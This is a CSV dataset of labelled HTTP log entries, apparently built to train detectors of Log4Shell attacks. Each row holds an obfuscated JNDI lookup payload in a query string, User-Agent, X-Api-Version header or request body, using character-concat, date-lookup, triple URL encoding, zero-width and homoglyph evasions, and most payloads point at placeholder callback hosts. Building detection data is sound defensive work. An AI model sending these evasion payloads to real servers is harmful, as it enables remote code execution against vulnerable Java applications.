id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
LS-001749,2026-05-17,adversarial_evasion,GET /api/check?debug=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://log4j-test.invalid/full-split} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://log4j-test.invalid/full-split} http/1.1 host: app.local,1,log4shell,lookup_character_concat,uri_param,train,critical
LS-001750,2026-05-17,adversarial_evasion,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://log4j-test.invalid/full-split} | Method: GET | Host: app.local | Path: /,request from user-agent: ${jndi:ldap://log4j-test.invalid/full-split} | method: get | host: app.local | path: /,1,log4shell,lookup_character_concat,user_agent,train,critical
LS-001751,2026-05-17,adversarial_evasion,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://log4j-test.invalid/full-split},request from user-agent: ${jndi:ldap://log4j-test.invalid/full-split},1,log4shell,lookup_character_concat,user_agent_minimal,train,critical
LS-001752,2026-05-17,adversarial_evasion,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: /login | X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://log4j-test.invalid/full-split},request from user-agent: curl/7.88.1 | method: get | host: app.local | path: /login | x-api-version: ${jndi:ldap://log4j-test.invalid/full-split},1,log4shell,lookup_character_concat,x_api_version,train,critical
LS-001753,2026-05-17,adversarial_evasion,GET /?q=${${date:'j'}ndi:ldap://log4j-test.invalid/date-j} HTTP/1.1,get /?q=${${date:'j'}ndi:ldap://log4j-test.invalid/date-j} http/1.1,1,log4shell,semantic_lookup_jndi,minimal_query,train,critical
LS-001754,2026-05-17,adversarial_evasion,GET /api/check?debug=${${date:'j'}ndi:ldap://log4j-test.invalid/date-j} HTTP/1.1 Host: app.local,get /api/check?debug=${${date:'j'}ndi:ldap://log4j-test.invalid/date-j} http/1.1 host: app.local,1,log4shell,semantic_lookup_jndi,uri_param,train,critical
LS-001755,2026-05-17,adversarial_evasion,Request from User-Agent: ${${date:'j'}ndi:ldap://log4j-test.invalid/date-j} | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${${date:'j'}ndi:ldap://log4j-test.invalid/date-j} | method: get | host: app.local | path: /static/app.js,1,log4shell,semantic_lookup_jndi,user_agent,train,critical
LS-001756,2026-05-17,adversarial_evasion,Request from User-Agent: ${${date:'j'}ndi:ldap://log4j-test.invalid/date-j},request from user-agent: ${${date:'j'}ndi:ldap://log4j-test.invalid/date-j},1,log4shell,semantic_lookup_jndi,user_agent_minimal,train,critical
LS-001757,2026-05-17,adversarial_evasion,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: /login | X-Api-Version: ${${date:'j'}ndi:ldap://log4j-test.invalid/date-j},request from user-agent: curl/7.88.1 | method: get | host: app.local | path: /login | x-api-version: ${${date:'j'}ndi:ldap://log4j-test.invalid/date-j},1,log4shell,semantic_lookup_jndi,x_api_version,train,critical
LS-001758,2026-05-17,adversarial_evasion,GET /search?q=${${date:'j'}ndi:ldap://log4j-test.invalid/date-j} HTTP/1.1 Host: app.local User-Agent: python-requests/2.31.0,get /search?q=${${date:'j'}ndi:ldap://log4j-test.invalid/date-j} http/1.1 host: app.local user-agent: python-requests/2.31.0,1,log4shell,semantic_lookup_jndi,path,train,critical
LS-001759,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${${date:'j'}ndi:ldap://log4j-test.invalid/date-j},post /search http/1.1 host: app.local body: query=${${date:'j'}ndi:ldap://log4j-test.invalid/date-j},1,log4shell,semantic_lookup_jndi,body,train,critical
LS-001760,2026-05-17,adversarial_evasion,GET /?q=${${date:'j'}ndi:ldap://log4j-test.invalid/date-j} HTTP/1.1,get /?q=${${date:'j'}ndi:ldap://log4j-test.invalid/date-j} http/1.1,1,log4shell,semantic_lookup_jndi,minimal_query,train,critical
LS-001761,2026-05-17,adversarial_evasion,GET /api/check?debug=${${date:'j'}ndi:ldap://log4j-test.invalid/date-j} HTTP/1.1 Host: app.local,get /api/check?debug=${${date:'j'}ndi:ldap://log4j-test.invalid/date-j} http/1.1 host: app.local,1,log4shell,semantic_lookup_jndi,uri_param,train,critical
LS-001762,2026-05-17,adversarial_evasion,Request from User-Agent: ${${date:'j'}ndi:ldap://log4j-test.invalid/date-j} | Method: GET | Host: app.local | Path: /home,request from user-agent: ${${date:'j'}ndi:ldap://log4j-test.invalid/date-j} | method: get | host: app.local | path: /home,1,log4shell,semantic_lookup_jndi,user_agent,train,critical
LS-001763,2026-05-17,adversarial_evasion,Request from User-Agent: ${${date:'j'}ndi:ldap://log4j-test.invalid/date-j},request from user-agent: ${${date:'j'}ndi:ldap://log4j-test.invalid/date-j},1,log4shell,semantic_lookup_jndi,user_agent_minimal,train,critical
LS-001764,2026-05-17,adversarial_evasion,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: / | X-Api-Version: ${${date:'j'}ndi:ldap://log4j-test.invalid/date-j},request from user-agent: curl/7.88.1 | method: get | host: app.local | path: / | x-api-version: ${${date:'j'}ndi:ldap://log4j-test.invalid/date-j},1,log4shell,semantic_lookup_jndi,x_api_version,train,critical
LS-001765,2026-05-17,adversarial_evasion,GET /?q=%252524%25257Bjndi%25253Aldap%25253A%25252F%25252Flog4j-test.invalid%25252Ftriple-train%25257D HTTP/1.1,get /?q=${jndi:ldap://log4j-test.invalid/triple-train} http/1.1,1,log4shell,triple_url_encoded,minimal_query,train,critical
LS-001766,2026-05-17,adversarial_evasion,GET /api/check?debug=%252524%25257Bjndi%25253Aldap%25253A%25252F%25252Flog4j-test.invalid%25252Ftriple-train%25257D HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://log4j-test.invalid/triple-train} http/1.1 host: app.local,1,log4shell,triple_url_encoded,uri_param,train,critical
LS-001767,2026-05-17,adversarial_evasion,Request from User-Agent: %252524%25257Bjndi%25253Aldap%25253A%25252F%25252Flog4j-test.invalid%25252Ftriple-train%25257D | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${jndi:ldap://log4j-test.invalid/triple-train} | method: get | host: app.local | path: /static/app.js,1,log4shell,triple_url_encoded,user_agent,train,critical
LS-001768,2026-05-17,adversarial_evasion,Request from User-Agent: %252524%25257Bjndi%25253Aldap%25253A%25252F%25252Flog4j-test.invalid%25252Ftriple-train%25257D,request from user-agent: ${jndi:ldap://log4j-test.invalid/triple-train},1,log4shell,triple_url_encoded,user_agent_minimal,train,critical
LS-001769,2026-05-17,adversarial_evasion,Request from User-Agent: Mozilla/5.0 Chrome/120.0 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: %252524%25257Bjndi%25253Aldap%25253A%25252F%25252Flog4j-test.invalid%25252Ftriple-train%25257D,request from user-agent: mozilla/5.0 chrome/120.0 | method: get | host: app.local | path: /metrics | x-api-version: ${jndi:ldap://log4j-test.invalid/triple-train},1,log4shell,triple_url_encoded,x_api_version,train,critical
LS-001770,2026-05-17,adversarial_evasion,GET /search?q=%252524%25257Bjndi%25253Aldap%25253A%25252F%25252Flog4j-test.invalid%25252Ftriple-train%25257D HTTP/1.1 Host: app.local User-Agent: Mozilla/5.0 Chrome/120.0,get /search?q=${jndi:ldap://log4j-test.invalid/triple-train} http/1.1 host: app.local user-agent: mozilla/5.0 chrome/120.0,1,log4shell,triple_url_encoded,path,train,critical
LS-001771,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=%252524%25257Bjndi%25253Aldap%25253A%25252F%25252Flog4j-test.invalid%25252Ftriple-train%25257D,post /search http/1.1 host: app.local body: query=${jndi:ldap://log4j-test.invalid/triple-train},1,log4shell,triple_url_encoded,body,train,critical
LS-001772,2026-05-17,adversarial_evasion,GET /?q=%252524%25257Bjndi%25253Aldap%25253A%25252F%25252Flog4j-test.invalid%25252Ftriple-train%25257D HTTP/1.1,get /?q=${jndi:ldap://log4j-test.invalid/triple-train} http/1.1,1,log4shell,triple_url_encoded,minimal_query,train,critical
LS-001773,2026-05-17,adversarial_evasion,GET /api/check?debug=%252524%25257Bjndi%25253Aldap%25253A%25252F%25252Flog4j-test.invalid%25252Ftriple-train%25257D HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://log4j-test.invalid/triple-train} http/1.1 host: app.local,1,log4shell,triple_url_encoded,uri_param,train,critical
LS-001774,2026-05-17,adversarial_evasion,Request from User-Agent: %252524%25257Bjndi%25253Aldap%25253A%25252F%25252Flog4j-test.invalid%25252Ftriple-train%25257D | Method: GET | Host: app.local | Path: /metrics,request from user-agent: ${jndi:ldap://log4j-test.invalid/triple-train} | method: get | host: app.local | path: /metrics,1,log4shell,triple_url_encoded,user_agent,train,critical
LS-001775,2026-05-17,adversarial_evasion,Request from User-Agent: %252524%25257Bjndi%25253Aldap%25253A%25252F%25252Flog4j-test.invalid%25252Ftriple-train%25257D,request from user-agent: ${jndi:ldap://log4j-test.invalid/triple-train},1,log4shell,triple_url_encoded,user_agent_minimal,train,critical
LS-001776,2026-05-17,adversarial_evasion,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: /api/products?id=123 | X-Api-Version: %252524%25257Bjndi%25253Aldap%25253A%25252F%25252Flog4j-test.invalid%25252Ftriple-train%25257D,request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: /api/products?id=123 | x-api-version: ${jndi:ldap://log4j-test.invalid/triple-train},1,log4shell,triple_url_encoded,x_api_version,train,critical
LS-001909,2026-05-17,adversarial_evasion,GET /?q=${j​ndi:ldap://callback.local/zw-j} HTTP/1.1,get /?q=${j​ndi:ldap://callback.local/zw-j} http/1.1,1,log4shell,zero_width_jndi,minimal_query,train,critical
LS-001910,2026-05-17,adversarial_evasion,GET /api/check?debug=${j​ndi:ldap://callback.local/zw-j} HTTP/1.1 Host: app.local,get /api/check?debug=${j​ndi:ldap://callback.local/zw-j} http/1.1 host: app.local,1,log4shell,zero_width_jndi,uri_param,train,critical
LS-001911,2026-05-17,adversarial_evasion,Request from User-Agent: ${j​ndi:ldap://callback.local/zw-j} | Method: GET | Host: app.local | Path: /api/products?id=123,request from user-agent: ${j​ndi:ldap://callback.local/zw-j} | method: get | host: app.local | path: /api/products?id=123,1,log4shell,zero_width_jndi,user_agent,train,critical
LS-001912,2026-05-17,adversarial_evasion,Request from User-Agent: ${j​ndi:ldap://callback.local/zw-j},request from user-agent: ${j​ndi:ldap://callback.local/zw-j},1,log4shell,zero_width_jndi,user_agent_minimal,train,critical
LS-001913,2026-05-17,adversarial_evasion,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: /search?q=boots | X-Api-Version: ${j​ndi:ldap://callback.local/zw-j},request from user-agent: java/11.0.13 | method: get | host: app.local | path: /search?q=boots | x-api-version: ${j​ndi:ldap://callback.local/zw-j},1,log4shell,zero_width_jndi,x_api_version,train,critical
LS-001914,2026-05-17,adversarial_evasion,GET /search?q=${j​ndi:ldap://callback.local/zw-j} HTTP/1.1 Host: app.local User-Agent: python-requests/2.31.0,get /search?q=${j​ndi:ldap://callback.local/zw-j} http/1.1 host: app.local user-agent: python-requests/2.31.0,1,log4shell,zero_width_jndi,path,train,critical
LS-001915,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${j​ndi:ldap://callback.local/zw-j},post /search http/1.1 host: app.local body: query=${j​ndi:ldap://callback.local/zw-j},1,log4shell,zero_width_jndi,body,train,critical
LS-001916,2026-05-17,adversarial_evasion,GET /?q=${j​ndi:ldap://callback.local/zw-j} HTTP/1.1,get /?q=${j​ndi:ldap://callback.local/zw-j} http/1.1,1,log4shell,zero_width_jndi,minimal_query,train,critical
LS-001917,2026-05-17,adversarial_evasion,GET /api/check?debug=${j​ndi:ldap://callback.local/zw-j} HTTP/1.1 Host: app.local,get /api/check?debug=${j​ndi:ldap://callback.local/zw-j} http/1.1 host: app.local,1,log4shell,zero_width_jndi,uri_param,train,critical
LS-001918,2026-05-17,adversarial_evasion,Request from User-Agent: ${j​ndi:ldap://callback.local/zw-j} | Method: GET | Host: app.local | Path: /,request from user-agent: ${j​ndi:ldap://callback.local/zw-j} | method: get | host: app.local | path: /,1,log4shell,zero_width_jndi,user_agent,train,critical
LS-001919,2026-05-17,adversarial_evasion,Request from User-Agent: ${j​ndi:ldap://callback.local/zw-j},request from user-agent: ${j​ndi:ldap://callback.local/zw-j},1,log4shell,zero_width_jndi,user_agent_minimal,train,critical
LS-001920,2026-05-17,adversarial_evasion,Request from User-Agent: Mozilla/5.0 Chrome/120.0 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: ${j​ndi:ldap://callback.local/zw-j},request from user-agent: mozilla/5.0 chrome/120.0 | method: get | host: app.local | path: /metrics | x-api-version: ${j​ndi:ldap://callback.local/zw-j},1,log4shell,zero_width_jndi,x_api_version,train,critical
LS-001921,2026-05-17,adversarial_evasion,GET /?q=${jn‌di:ldap://callback.local/zw-n} HTTP/1.1,get /?q=${jn‌di:ldap://callback.local/zw-n} http/1.1,1,log4shell,zero_width_jndi,minimal_query,train,critical
LS-001922,2026-05-17,adversarial_evasion,GET /api/check?debug=${jn‌di:ldap://callback.local/zw-n} HTTP/1.1 Host: app.local,get /api/check?debug=${jn‌di:ldap://callback.local/zw-n} http/1.1 host: app.local,1,log4shell,zero_width_jndi,uri_param,train,critical
LS-001923,2026-05-17,adversarial_evasion,Request from User-Agent: ${jn‌di:ldap://callback.local/zw-n} | Method: GET | Host: app.local | Path: /home,request from user-agent: ${jn‌di:ldap://callback.local/zw-n} | method: get | host: app.local | path: /home,1,log4shell,zero_width_jndi,user_agent,train,critical
LS-001924,2026-05-17,adversarial_evasion,Request from User-Agent: ${jn‌di:ldap://callback.local/zw-n},request from user-agent: ${jn‌di:ldap://callback.local/zw-n},1,log4shell,zero_width_jndi,user_agent_minimal,train,critical
LS-001925,2026-05-17,adversarial_evasion,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: / | X-Api-Version: ${jn‌di:ldap://callback.local/zw-n},request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: / | x-api-version: ${jn‌di:ldap://callback.local/zw-n},1,log4shell,zero_width_jndi,x_api_version,train,critical
LS-001926,2026-05-17,adversarial_evasion,GET /search?q=${jn‌di:ldap://callback.local/zw-n} HTTP/1.1 Host: app.local User-Agent: Mozilla/5.0 Safari/605.1.15,get /search?q=${jn‌di:ldap://callback.local/zw-n} http/1.1 host: app.local user-agent: mozilla/5.0 safari/605.1.15,1,log4shell,zero_width_jndi,path,train,critical
LS-001927,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${jn‌di:ldap://callback.local/zw-n},post /search http/1.1 host: app.local body: query=${jn‌di:ldap://callback.local/zw-n},1,log4shell,zero_width_jndi,body,train,critical
LS-001928,2026-05-17,adversarial_evasion,GET /?q=${jn‌di:ldap://callback.local/zw-n} HTTP/1.1,get /?q=${jn‌di:ldap://callback.local/zw-n} http/1.1,1,log4shell,zero_width_jndi,minimal_query,train,critical
LS-001929,2026-05-17,adversarial_evasion,GET /api/check?debug=${jn‌di:ldap://callback.local/zw-n} HTTP/1.1 Host: app.local,get /api/check?debug=${jn‌di:ldap://callback.local/zw-n} http/1.1 host: app.local,1,log4shell,zero_width_jndi,uri_param,train,critical
LS-001930,2026-05-17,adversarial_evasion,Request from User-Agent: ${jn‌di:ldap://callback.local/zw-n} | Method: GET | Host: app.local | Path: /login,request from user-agent: ${jn‌di:ldap://callback.local/zw-n} | method: get | host: app.local | path: /login,1,log4shell,zero_width_jndi,user_agent,train,critical
LS-001931,2026-05-17,adversarial_evasion,Request from User-Agent: ${jn‌di:ldap://callback.local/zw-n},request from user-agent: ${jn‌di:ldap://callback.local/zw-n},1,log4shell,zero_width_jndi,user_agent_minimal,train,critical
LS-001932,2026-05-17,adversarial_evasion,Request from User-Agent: Mozilla/5.0 Chrome/120.0 | Method: GET | Host: app.local | Path: / | X-Api-Version: ${jn‌di:ldap://callback.local/zw-n},request from user-agent: mozilla/5.0 chrome/120.0 | method: get | host: app.local | path: / | x-api-version: ${jn‌di:ldap://callback.local/zw-n},1,log4shell,zero_width_jndi,x_api_version,train,critical
LS-001933,2026-05-17,adversarial_evasion,GET /?q=${ȷndi:ldap://callback.local/latin-dotless-j} HTTP/1.1,get /?q=${ȷndi:ldap://callback.local/latin-dotless-j} http/1.1,1,log4shell,homoglyph_jndi,minimal_query,train,critical
LS-001934,2026-05-17,adversarial_evasion,GET /api/check?debug=${ȷndi:ldap://callback.local/latin-dotless-j} HTTP/1.1 Host: app.local,get /api/check?debug=${ȷndi:ldap://callback.local/latin-dotless-j} http/1.1 host: app.local,1,log4shell,homoglyph_jndi,uri_param,train,critical
LS-001935,2026-05-17,adversarial_evasion,Request from User-Agent: ${ȷndi:ldap://callback.local/latin-dotless-j} | Method: GET | Host: app.local | Path: /search?q=boots,request from user-agent: ${ȷndi:ldap://callback.local/latin-dotless-j} | method: get | host: app.local | path: /search?q=boots,1,log4shell,homoglyph_jndi,user_agent,train,critical
LS-001936,2026-05-17,adversarial_evasion,Request from User-Agent: ${ȷndi:ldap://callback.local/latin-dotless-j},request from user-agent: ${ȷndi:ldap://callback.local/latin-dotless-j},1,log4shell,homoglyph_jndi,user_agent_minimal,train,critical
LS-001937,2026-05-17,adversarial_evasion,Request from User-Agent: PostmanRuntime/7.36.1 | Method: GET | Host: app.local | Path: /api/products?id=123 | X-Api-Version: ${ȷndi:ldap://callback.local/latin-dotless-j},request from user-agent: postmanruntime/7.36.1 | method: get | host: app.local | path: /api/products?id=123 | x-api-version: ${ȷndi:ldap://callback.local/latin-dotless-j},1,log4shell,homoglyph_jndi,x_api_version,train,critical
